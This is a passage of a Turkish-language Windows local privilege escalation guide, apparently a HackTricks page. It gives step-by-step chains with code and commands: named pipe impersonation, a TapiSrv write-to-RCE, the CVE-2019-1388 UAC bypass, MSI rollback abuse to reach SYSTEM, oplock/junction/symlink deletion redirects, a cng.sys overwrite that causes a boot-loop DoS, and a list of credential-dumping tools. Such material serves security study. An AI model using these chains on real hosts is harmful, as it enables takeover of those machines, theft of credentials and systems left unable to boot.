Windows, ilgisiz process'lerin farklı ağlar üzerinden bile veri paylaşmasına olanak tanıyan **Named Pipes** adlı bir özellik sunar. Bu, rollerin **named pipe server** ve **named pipe client** olarak tanımlandığı bir client/server mimarisine benzer.

Bir **client** pipe üzerinden veri gönderdiğinde, pipe'ı kuran **server**, gerekli **SeImpersonate** haklarına sahip olması koşuluyla **client'ın kimliğine bürünebilir**. Taklit edebileceğiniz bir pipe üzerinden iletişim kuran **ayrıcalıklı bir process** tespit etmek, kurduğunuz pipe ile etkileşime geçtiğinde o process'in kimliğini benimseyerek **daha yüksek ayrıcalıklar elde etme** fırsatı sunar. Böyle bir saldırının nasıl gerçekleştirileceğine dair yardımcı kılavuzlara [**buradan**](named-pipe-client-impersonation.md) ve [**buradan**](#from-high-integrity-to-system) ulaşabilirsiniz.

Ayrıca, aşağıdaki araç **burp gibi bir araçla named pipe iletişimini yakalamanızı sağlar:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **ve bu araç, privesc'leri bulmak için tüm pipe'ları listeleyip görüntülemenizi sağlar** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Telephony service (TapiSrv), server modunda `\\pipe\\tapsrv` (MS-TRP) uç noktasını açığa çıkarır. Uzaktan kimlik doğrulaması yapmış bir client, mailslot tabanlı asenkron event yolunu kötüye kullanarak `ClientAttach`'i, `NETWORK SERVICE` tarafından yazılabilir mevcut herhangi bir dosyaya yönelik rastgele bir **4-byte yazma** işlemine dönüştürebilir; ardından Telephony admin hakları elde edip service olarak rastgele bir DLL yükleyebilir. İşleyişin tamamı:

- `pszDomainUser` değerini yazılabilir mevcut bir yol olarak ayarlayarak `ClientAttach` çağrısı yapın → service, bu yolu `CreateFileW(..., OPEN_EXISTING)` ile açar ve asenkron event yazma işlemleri için kullanır.
- Her event, `Initialize` içindeki saldırgan denetimindeki `InitContext` değerini bu handle'a yazar. `LRegisterRequestRecipient` (`Req_Func 61`) ile bir line app kaydedin, `TRequestMakeCall` (`Req_Func 121`) çağrısını tetikleyin, `GetAsyncEvents` (`Req_Func 0`) ile alın, ardından deterministik yazma işlemlerini tekrarlamak için kaydı silin/kapatın.
- `C:\Windows\TAPI\tsec.ini` içindeki `[TapiAdministrators]` grubuna kendinizi ekleyip yeniden bağlanın, ardından `GetUIDllName` çağrısına rastgele bir DLL yolu vererek `TSPI_providerUIIdentify` işlevini `NETWORK SERVICE` olarak çalıştırın.

Daha fazla ayrıntı:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Çeşitli

### Windows'ta İşlem Yürütebilen Dosya Uzantıları

**[https://filesec.io/](https://filesec.io/)** sayfasına göz atın.

### Markdown renderer'ları üzerinden Protocol handler / ShellExecute kötüye kullanımı

`ShellExecuteExW`'ye iletilen tıklanabilir Markdown bağlantıları, tehlikeli URI handler'larını (`file:`, `ms-appinstaller:` veya kayıtlı herhangi bir şema) tetikleyebilir ve saldırgan denetimindeki dosyaları geçerli kullanıcı olarak çalıştırabilir. Bkz.:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Parolalar için Command Line'ları İzleme**

Bir kullanıcı olarak shell aldığınızda, **kimlik bilgilerini command line üzerinden ileten** zamanlanmış görevler veya çalıştırılan başka process'ler olabilir. Aşağıdaki script, her iki saniyede bir process command line'larını yakalar ve mevcut durumu önceki durumla karşılaştırarak farklılıkları görüntüler.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Süreçlerden parola çalma

## Düşük Yetkili Kullanıcıdan NT\AUTHORITY SYSTEM'e (CVE-2019-1388) / UAC Bypass

Grafik arayüze (konsol veya RDP üzerinden) erişiminiz varsa ve UAC etkinse, Microsoft Windows'un bazı sürümlerinde ayrıcalıksız bir kullanıcıdan terminali veya "NT\AUTHORITY SYSTEM" gibi başka bir süreci çalıştırmak mümkündür.

Bu sayede aynı güvenlik açığıyla hem ayrıcalıkları yükseltmek hem de UAC'yi atlatmak mümkün olur. Ayrıca hiçbir şey yüklemeniz gerekmez ve işlem sırasında kullanılan ikili dosya Microsoft tarafından imzalanmış ve yayımlanmıştır.

Etkilenen sistemlerden bazıları şunlardır:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Bu güvenlik açığından yararlanmak için aşağıdaki adımları gerçekleştirmek gerekir:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

You have all the necessary files and information in the following GitHub repository:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Administrator Medium Integrity Level'dan High Integrity Level'a / UAC Bypass

**Integrity Levels hakkında bilgi edinmek için** bunu okuyun:


{{#ref}}
integrity-levels.md
{{#endref}}

Ardından **UAC ve UAC bypass'ları hakkında bilgi edinmek için** bunu okuyun:


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Sunulan Bir Kök Dizine Upload Directory Junction'ları

Bir uygulama, tahmin edilebilir bir upload alt dizini oluşturabilir, bu dizine çağıranın sağladığı bir dosya adını yazabilir ve ardından dosyayı işleyebilir. Düşük ayrıcalıklı bir kullanıcı, sunucu tarafındaki yazma işlemi gerçekleşmeden önce bu alt dizini kaldırıp bir NTFS junction ile değiştirebiliyorsa, yazma işlemi junction'ı izleyerek web sunucusunun sunduğu bir dizine yönlenebilir. Sunucu bu dosya türünü çalıştırıyorsa, buraya yerleştirilen bir script web hizmeti kimliğiyle çalışabilir. Bu, uygulamaya özgü bir arbitrary-write sınırıdır; yalnızca yazılabilir bir upload dizininin veya mevcut bir junction'ın bulunması bunu kanıtlamaz.

Upload handler'daki kesin yol oluşturma biçimini ve zamanlamayı, kullanıcının alt dizin üzerindeki etkili silme/oluşturma izinlerini, hedef dizinin etkili ACL'lerini, yazıcının reparse point'leri izleyip izlemediğini ve web sunucusunun hedef dizindeki dosyaları çalıştırıp çalıştırmadığını kontrol edin. Yazıcının ve web sunucusunun işlem kimliklerini ayrı ayrı doğrulayın. Pasif envanter, dizin ACL'lerini ve reparse metadata'sını gösterebilir; ancak handler'ın davranışını veya gelecekteki bir junction değişimini kanıtlayamaz. Çalıştırma bir hizmet hesabı kapsamında gerçekleşiyorsa, ayrı bir token-privilege yolunu değerlendirmeden önce **gerçek işlem token'ını** inceleyin.

## SYSTEM EoP için Herhangi Bir Klasörü Silme/Taşıma/Yeniden Adlandırma

[**Bu blog gönderisinde**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) açıklanan teknik, exploit koduyla [**burada mevcut**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

Saldırı temel olarak, kaldırma işlemi sırasında meşru dosyaları zararlılarla değiştirmek için Windows Installer'ın rollback özelliğinden yararlanır. Bunun için saldırganın, Windows Installer'ın diğer MSI paketlerinin kaldırılması sırasında rollback dosyalarını depolamak üzere daha sonra kullanacağı `C:\Config.Msi` klasörünü ele geçirmek için kullanılacak **zararlı bir MSI installer** oluşturması gerekir. Bu rollback dosyaları, zararlı payload'ı içerecek şekilde değiştirilmiş olur.

### Windows Installer COM cleanup-path injection (CVE-2025-27727)

Düşük ayrıcalıklı bir istemci, `CMsiConfigurationManager` COM nesnesi (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`) üzerinden SYSTEM `msiexec.exe` hizmetine erişebilir. Tersine mühendislik, ilgili `IMsiServer` çağrılarının vtable'daki `0xA0` offset'inde `MsiBeginTransactionW`, `0xC8` offset'inde `SetEEUIDirectoryAndFilter` ve `0x50` offset'inde `CleanupTempPackages` olduğunu belirledi. Bu adlar ve offset'ler tersine mühendislikle elde edilmiştir ve build'ler arasında değişebilir.<sup>[[41]](#references)</sup>

Yönetici olmayan bir kullanıcı için `SetEEUIDirectoryAndFilter`, yalnızca sağlanan yolu `DELETE`, `FILE_FLAG_BACKUP_SEMANTICS` ve `FILE_FLAG_OPEN_REPARSE_POINT` ile açarken çağıranın kimliğine bürünür. Bu, çağıranın dizini silebildiğini doğrular ve reparse point'in izlenmesini önler; ancak kontrol edilen dosya nesnesini sonraki cleanup işlemine bağlamaz veya nesnenin Windows Installer tarafından oluşturulduğunu kanıtlamaz.<sup>[[41]](#references)</sup>

`MsiBeginTransactionW` sonrasında `SetEEUIDirectoryAndFilter`, çağıranın filter argümanından bağımsız olarak yolu klasör olarak planlar. Hizmet, `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages` altına adlandırılmış bir `REG_DWORD` değeri yazar: değer adı çağıranın kontrolündeki yoldur ve `0x00000002` verisi klasör bayrağıdır. Ardından `CleanupTempPackages(NULL, FALSE)` doğrudan cleanup işlemine geçer. Yükseltilmiş yetkilerle çalışan iş parçacığı kayıt defteri değerlerini sıralar ve klasör girdilerini, yolun kaynağını denetlemeden, özyinelemeli `FDeleteFolder` işlevine iletir. Normal kaldırma başarısız olursa kod ayrıca `LockdownPath` çağrısı yapar, dosya özniteliklerini temizler ve yeniden dener.<sup>[[41]](#references)</sup>

`msi.dll` dosyasından çıkarılan asgari çağrı sırası şöyledir:<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

Kullanışlı primitive, junction yönlendirmesi yerine path reuse kullanmaktır. Saldırganın oluşturduğu `C:\Config.Msi` yolunu kaydedip silin ve Windows Installer'ın daha sonra bu pathname'i korumalı rollback verileriyle yeniden oluşturmasını bekleyin. Temizleme işlemi eski `TempPackages` adına güvenir ve yeni dizini SYSTEM olarak siler. Reparse point gerekmediğinden bu yöntem, `FILE_FLAG_OPEN_REPARSE_POINT` ve redirection-trust mitigation ile amaçlanan sınırı aşar.<sup>[[41]](#references)</sup>

Bu silme primitive'i aşağıdaki rollback zincirine uyar: ayrı `Installer\Folders` kaydını koruyun, korumalı `C:\Config.Msi` dizinini silin, NULL DACL ile yeniden oluşturun ve installer DACL'yi sertleştirmeden önce `WRITE_DAC` izni verilmiş bir handle tutun. Önceden açılmış handle, `NtSetSecurityObject` ile izin veren bir DACL'yi geri yükleyebilir; ardından rollback devam etmeden önce oluşturulan `.rbs` değiştirilebilir.<sup>[[41]](#references)</sup>

Microsoft, yeni feature gate etkinleştirildiğinde `CMsiTransaction::SetEEUIDirectoryAndFilter` işlevinin `ScheduleFileOrFolderDelete` çağırmasını engelleyerek bu yolu düzeltti. COM çağrısı yine de başarı döndürebilir ancak saldırganın kontrolündeki yolu artık `TempPackages` içine eklemez. Başarılı method dönüşünü yama testi olarak kullanmak yerine April 2025 Windows security updates güncellemelerini yükleyin.<sup>[[41]](#references)[[42]](#references)</sup>

Tekniğin özeti şöyledir:

1. **Aşama 1 – Hijack için Hazırlık (`C:\Config.Msi` dizinini boş bırakın)**

- Adım 1: MSI'ı yükleyin
    - Yazılabilir bir klasöre (`TARGETDIR`) zararsız bir dosya (ör. `dummy.txt`) yükleyen bir `.msi` oluşturun.
    - **Admin olmayan bir kullanıcının** çalıştırabilmesi için installer'ı **"UAC Compliant"** olarak işaretleyin.
    - Yüklemeden sonra dosyaya ait bir **handle** açık tutun.

- Adım 2: Uninstall işlemini başlatın
    - Aynı `.msi` dosyasını uninstall edin.
    - Uninstall işlemi dosyaları `C:\Config.Msi` dizinine taşımaya ve `.rbf` dosyaları (rollback yedekleri) olarak yeniden adlandırmaya başlar.
    - Dosya `C:\Config.Msi\<random>.rbf` olduğunda tespit etmek için `GetFinalPathNameByHandle` kullanarak açık dosya handle'ını **poll edin**.

- Adım 3: Özel Sync
    - `.msi`, aşağıdakileri yapan bir **özel uninstall action (`SyncOnRbfWritten`)** içerir:
        - `.rbf` dosyasının yazıldığını bildirir.
        - Ardından uninstall işlemine devam etmeden önce başka bir event üzerinde **bekler**.

- Adım 4: `.rbf` dosyasının silinmesini engelleyin
    - Bildirim geldiğinde `.rbf` dosyasını `FILE_SHARE_DELETE` olmadan **açın** — bu, **dosyanın silinmesini önler**.
    - Ardından uninstall işleminin tamamlanabilmesi için geri sinyal verin.
    - Windows Installer `.rbf` dosyasını silemez ve tüm içeriği silemediği için **`C:\Config.Msi` kaldırılmaz**.

- Adım 5: `.rbf` dosyasını elle silin
    - `.rbf` dosyasını (saldırgan olarak) elle silin.
    - Artık **`C:\Config.Msi` boş** ve hijack edilmeye hazırdır.

> Bu noktada, `C:\Config.Msi` dizinini silmek için **SYSTEM seviyesinde arbitrary folder delete vulnerability** tetikleyin.

2. **Aşama 2 – Rollback Script'lerini Kötü Amaçlı Olanlarla Değiştirme**

- Adım 6: `C:\Config.Msi` dizinini zayıf ACL'lerle yeniden oluşturun
    - `C:\Config.Msi` klasörünü kendiniz yeniden oluşturun.
    - **Zayıf DACL'ler** (ör. Everyone:F) ayarlayın ve `WRITE_DAC` ile bir handle'ı **açık tutun**.

- Adım 7: Başka bir Install işlemi çalıştırın
    - `.msi` dosyasını tekrar yükleyin ve şunları belirtin:
        - `TARGETDIR`: Yazılabilir konum.
        - `ERROROUT`: Zorunlu bir hatayı tetikleyen değişken.
    - Bu install işlemi, `.rbs` ve `.rbf` dosyalarını okuyan **rollback** işlemini yeniden tetiklemek için kullanılacaktır.

- Adım 8: `.rbs` dosyasını izleyin
    - Yeni bir `.rbs` dosyası görünene kadar `C:\Config.Msi` dizinini izlemek için `ReadDirectoryChangesW` kullanın.
    - Dosya adını alın.

- Adım 9: Rollback öncesinde sync yapın
    - `.msi`, aşağıdakileri yapan bir **özel install action (`SyncBeforeRollback`)** içerir:
        - `.rbs` oluşturulduğunda bir event bildirir.
        - Ardından devam etmeden önce **bekler**.

- Adım 10: Zayıf ACL'leri yeniden uygulayın
    - `.rbs created` event'ini aldıktan sonra:
        - Windows Installer, `C:\Config.Msi` dizinine **güçlü ACL'leri yeniden uygular**.
        - Ancak `WRITE_DAC` izinli bir handle hâlâ elinizde olduğundan, **zayıf ACL'leri yeniden uygulayabilirsiniz**.

> ACL'ler **yalnızca handle açılırken uygulanır**; dolayısıyla klasöre yazmaya devam edebilirsiniz.

- Adım 11: Sahte `.rbs` ve `.rbf` dosyalarını bırakın
    - `.rbs` dosyasının üzerine Windows'a şunları yaptıran **sahte bir rollback script** yazın:
        - `.rbf` dosyanızı (kötü amaçlı DLL) **ayrıcalıklı bir konuma** (ör. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`) geri yükleme.
    - **SYSTEM seviyesinde kötü amaçlı payload DLL** içeren sahte `.rbf` dosyanızı bırakın.

- Adım 12: Rollback'i tetikleyin
    - Installer'ın devam etmesi için sync event'ine sinyal gönderin.
    - **Type 19 custom action (`ErrorOut`)**, install işlemini bilinen bir noktada **kasten başarısız kılacak** şekilde yapılandırılmıştır.
    - Bu, **rollback işlemini başlatır**.

- Adım 13: SYSTEM, DLL'inizi yükler
    - Windows Installer:
        - Kötü amaçlı `.rbs` dosyanızı okur.
        - `.rbf` DLL'inizi hedef konuma kopyalar.
    - Artık **SYSTEM tarafından yüklenen bir path'te kötü amaçlı DLL'iniz** bulunur.

- Son Adım: SYSTEM Code'u çalıştırın
    - Hijack ettiğiniz DLL'i yükleyen güvenilir bir **auto-elevated binary** (ör. `osk.exe`) çalıştırın.
    - **İşte böyle**: Kodunuz **SYSTEM olarak** çalıştırılır.


### Arbitrary File Delete/Move/Rename'den SYSTEM EoP'ye

Ana MSI rollback tekniği (bir önceki) **tüm bir klasörü** (ör. `C:\Config.Msi`) silebildiğinizi varsayar. Peki ya vulnerability'niz yalnızca **arbitrary file deletion** sağlıyorsa?

**NTFS internals**'ı kullanarak exploit geliştirebilirsiniz: Her klasörün şu adla bilinen gizli bir alternate data stream'i vardır:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Bu stream, klasörün **index metadata** bilgisini depolar.

Bu nedenle, bir klasörün `::$INDEX_ALLOCATION` stream'ini **silerseniz**, NTFS **klasörün tamamını** dosya sisteminden kaldırır.

Bunu aşağıdaki gibi standart file deletion API'lerini kullanarak yapabilirsiniz:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Bir *file* delete API’sini çağırıyor olsanız bile **klasörün kendisini siler**.

### Klasör İçeriğini Silmeden SYSTEM EoP’ye
Primitive’iniz rastgele dosya/klasörleri silmenize izin vermiyor, ancak saldırganın kontrolündeki bir klasörün *içeriğini* silmenize izin veriyorsa ne olur?

1. Adım 1: Yem klasörü ve dosyası oluşturun
- Oluşturun: `C:\temp\folder1`
- İçine şunu ekleyin: `C:\temp\folder1\file1.txt`

2. Adım 2: `file1.txt` üzerinde bir **oplock** ayarlayın
- Privileged bir process `file1.txt` dosyasını silmeye çalıştığında **oplock yürütmeyi duraklatır**.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Adım 3: SYSTEM sürecini tetikle (ör. `SilentCleanup`)
- Bu süreç klasörleri (ör. `%TEMP%`) tarar ve içeriklerini silmeye çalışır.
- `file1.txt` dosyasına ulaştığında **oplock tetiklenir** ve kontrolü callback'inize devreder.

4. Adım 4: Oplock callback'inin içinde – silme işlemini yönlendir

- Seçenek A: `file1.txt` dosyasını başka bir yere taşı
    - Bu, oplock'i bozmadan `folder1` klasörünü boşaltır.
    - `file1.txt` dosyasını doğrudan silmeyin — bu, oplock'i zamanından önce serbest bırakır.

- Seçenek B: `folder1` klasörünü bir **junction**'a dönüştür:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Seçenek C: `\RPC Control` içinde bir **symlink** oluşturun:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Bu, klasör meta verilerini depolayan NTFS iç akışını hedefler — bunu silmek klasörü siler.

5. Adım 5: Oplock'u serbest bırakın
- SYSTEM işlemi devam eder ve `file1.txt` dosyasını silmeye çalışır.
- Ancak şimdi, junction + symlink nedeniyle aslında şunu silmektedir:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Sonuç**: `C:\Config.Msi`, SYSTEM tarafından silinir.

### İstediğiniz Yerde Klasör Oluşturma Yetkisinden Kalıcı DoS'a

**SYSTEM/admin olarak istediğiniz yerde klasör oluşturmanızı** sağlayan bir primitive'den yararlanın — **dosya yazamasanız** veya **zayıf izinler ayarlayamasanız** bile.

**Kritik bir Windows driver'ın** adını taşıyan bir **klasör** oluşturun (dosya değil), örneğin:
```
C:\Windows\System32\cng.sys
```

- Bu yol normalde `cng.sys` kernel-mode sürücüsüne karşılık gelir.
- Bunu **önceden bir klasör olarak oluşturursanız**, Windows açılışta gerçek sürücüyü yükleyemez.
- Ardından Windows, açılış sırasında `cng.sys` dosyasını yüklemeye çalışır.
- Klasörü görür, **gerçek sürücüyü bulamaz** ve **açılış sırasında çöker veya durur**.
- Harici müdahale (ör. açılış onarımı veya diske erişim) olmadan **yedek bir seçenek** ya da **kurtarma yolu yoktur**.

### Ayrıcalıklı log/yedekleme yollarından ve OM symlink’lerinden keyfi dosya üzerine yazma / açılış DoS’una

Bir **ayrıcalıklı servis**, **yazılabilir bir config** dosyasından okuduğu bir yola log/dışa aktarma verisi yazdığında, **Object Manager symlink’leri + NTFS mount point’leri** kullanarak bu yolu yönlendirin ve ayrıcalıklı yazma işlemini keyfi dosya üzerine yazmaya dönüştürün (SeCreateSymbolicLinkPrivilege olmadan bile).<sup>[[15]](#references)</sup>

**Gereksinimler**
- Hedef yolu tutan config dosyasının saldırgan tarafından yazılabilir olması (ör. `%ProgramData%\...\.ini`).
- `\RPC Control` konumuna bir mount point ve bir OM file symlink oluşturabilme (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Bu yola yazan ayrıcalıklı bir işlem (log, dışa aktarma, rapor).

**Örnek zincir**
1. Ayrıcalıklı log hedefini bulmak için config dosyasını okuyun. Örneğin, `C:\ProgramData\ICONICS\IcoSetup64.ini` içindeki `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt`.
2. Yolu admin olmadan yönlendirin:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Privileged component'ın logu yazmasını bekleyin (ör. admin "send test SMS" işlemini tetikler). Yazma işlemi artık `C:\Windows\System32\cng.sys` dosyasına yapılır.
4. Bozulmayı doğrulamak için üzerine yazılan hedefi inceleyin (hex/PE parser); yeniden başlatma, Windows'un değiştirilmiş driver yolunu yüklemesini zorlar → **boot loop DoS**. Bu yöntem, ayrıcalıklı bir service'in yazma amacıyla açacağı tüm korumalı dosyalara da uygulanabilir.

> `cng.sys` normalde `C:\Windows\System32\drivers\cng.sys` konumundan yüklenir; ancak `C:\Windows\System32\cng.sys` konumunda bir kopya varsa önce bu kopya denenebilir ve bozuk veriler için güvenilir bir DoS sink'i oluşturabilir.



## **High Integrity'den System'e**

### **Yeni service**

Zaten High Integrity düzeyinde çalışan bir process içindeyseniz, **SYSTEM'e giden yol** yalnızca **yeni bir service oluşturup çalıştırarak** kolayca açılabilir:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Bir service binary oluştururken bunun geçerli bir service olduğundan veya binary'nin gerekli işlemleri hızlıca gerçekleştirdiğinden emin olun; geçerli bir service değilse 20 saniye içinde sonlandırılır.

### AlwaysInstallElevated

High Integrity bir process'ten **AlwaysInstallElevated registry kayıtlarını etkinleştirmeyi** ve bir _**.msi**_ wrapper kullanarak bir reverse shell **yüklemeyi** deneyebilirsiniz.\
[İlgili registry anahtarları ve bir _.msi_ paketini nasıl yükleyeceğiniz hakkında daha fazla bilgi burada.](#alwaysinstallelevated)

### High + SeImpersonate yetkisinden System'e

**Kodu** [**burada bulabilirsiniz**](seimpersonate-from-high-to-system.md)**.**

### SeDebug + SeImpersonate'ten Full Token yetkilerine

Bu token yetkilerine sahipseniz (muhtemelen bunu zaten High Integrity olan bir process'te bulursunuz), SeDebug yetkisiyle (korumalı process'ler hariç) **neredeyse her process'i açabilir**, process'in **token'ını kopyalayabilir** ve bu token ile **istediğiniz bir process'i oluşturabilirsiniz**.\
Bu teknik genellikle **tüm token yetkilerine sahip SYSTEM olarak çalışan bir process'i seçmek için kullanılır** (_evet, tüm token yetkilerine sahip olmayan SYSTEM process'leri bulabilirsiniz_).\
**Önerilen tekniği uygulayan bir kod** [**örneğini burada bulabilirsiniz**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Bu teknik, meterpreter tarafından `getsystem` ile privilege escalation yapmak için kullanılır. Teknik, **bir pipe oluşturup ardından bu pipe'a yazması için bir service oluşturmayı/kötüye kullanmayı** içerir. Ardından **`SeImpersonate`** yetkisini kullanarak pipe'ı oluşturan **server**, pipe client'ının (service) **token'ını taklit ederek** SYSTEM yetkileri elde edebilir.\
[**Named pipe'lar hakkında daha fazla bilgi edinmek için bunu okuyun**](#named-pipe-client-impersonation).\
[**Named pipe'lar kullanarak High Integrity'den System'e nasıl geçileceğine dair bir örnek için bunu okuyun**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

**SYSTEM** olarak çalışan bir **process** tarafından **yüklenen** bir dll'i **hijack** etmeyi başarırsanız, bu yetkilerle istediğiniz kodu çalıştırabilirsiniz. Bu nedenle Dll Hijacking bu tür privilege escalation için de kullanışlıdır. Ayrıca, dll'leri yüklemek için kullanılan klasörlerde **yazma yetkisi** olacağından bunu **High Integrity bir process'ten yapmak çok daha kolaydır**.\
**Dll hijacking hakkında** [**buradan daha fazla bilgi edinebilirsiniz**](dll-hijacking/index.html)**.**

### **Administrator veya Network Service'ten System'e**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### LOCAL SERVICE veya NETWORK SERVICE'ten tam yetkilere

**Oku:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Daha fazla yardım

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Kullanışlı araçlar

**Windows local privilege escalation vektörlerini bulmak için en iyi araç:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Yanlış yapılandırmaları ve hassas dosyaları kontrol eder (**[**buraya bakın**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Tespit edilir.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Bazı olası yanlış yapılandırmaları kontrol eder ve bilgi toplar (**[**buraya bakın**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Yanlış yapılandırmaları kontrol eder**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY, WinSCP, SuperPuTTY, FileZilla ve RDP kayıtlı oturum bilgilerini çıkarır. Yerel ortamda -Thorough kullanın.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager'dan kimlik bilgilerini çıkarır. Tespit edilir.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Toplanan parolaları domain genelinde spray eder**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh, bir PowerShell ADIDNS/LLMNR/mDNS spoofing ve man-in-the-middle aracıdır.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Temel Windows privesc enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Bilinen privesc zafiyetlerini arar (Watson nedeniyle KULLANIMDAN KALDIRILDI)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Yerel kontroller **(Admin yetkileri gerekir)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Bilinen privesc zafiyetlerini arar (VisualStudio kullanılarak derlenmesi gerekir) ([**önceden derlenmiş**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Yanlış yapılandırmaları aramak için host'u enumerate eder (privesc aracından çok bilgi toplama aracıdır) (derlenmesi gerekir) **(**[**önceden derlenmiş**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Birçok yazılımdan kimlik bilgilerini çıkarır (GitHub'da önceden derlenmiş exe)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp'ın C# portu**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Yanlış yapılandırmaları kontrol eder (GitHub'da önceden derlenmiş executable). Önerilmez. Win10'da düzgün çalışmaz.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Olası yanlış yapılandırmaları kontrol eder (Python'dan exe). Önerilmez. Win10'da düzgün çalışmaz.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Bu gönderiye dayanarak oluşturulmuş araç (düzgün çalışması için accesschk gerekmez, ancak kullanabilir).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** çıktısını okur ve çalışan exploit'ler önerir (yerel Python)\
